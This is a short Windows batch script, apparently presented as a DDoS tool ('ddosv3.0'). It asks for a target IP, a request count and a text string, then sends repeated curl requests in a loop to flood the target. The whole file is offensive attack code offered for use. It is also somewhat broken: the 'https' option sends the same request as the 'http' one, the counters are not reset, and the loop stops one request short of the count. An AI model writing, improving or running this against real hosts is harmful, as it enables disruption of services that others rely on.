:main
@echo off && color c && cls && TITLE ddosv3.0 (code by Whiteavocado and Reveloperboy)
set /p "question=http or https:"
if %question% == http goto http
if %question% == https goto https
goto main

:http
set /p "target_ip=target ip:"
set /p "requests=how many requests:"
set /p "text=request text (use _ for space!):"
:http_start
set /a loop1+=1
if %loop1% EQU %requests% goto http_end
curl "%target_ip%/%text%" && cls
goto http_start

:http_end
cls
echo send %requests% request(s) to http://%target_ip% with text:"%text%".
set /p "end="
goto main



:https
set /p "target_ip=target ip:"
set /p "requests=how many requests:"
set /p "text=request text (use _ for space!)"
:https_start
set /a loop2+=1
if %loop2% EQU %requests% goto https_end
curl "%target_ip%/%text%" && cls
goto https_start

:https_end
cls
echo send %requests% request(s) to https://%target_ip% with text:"%text%".
set /p "end="
goto main
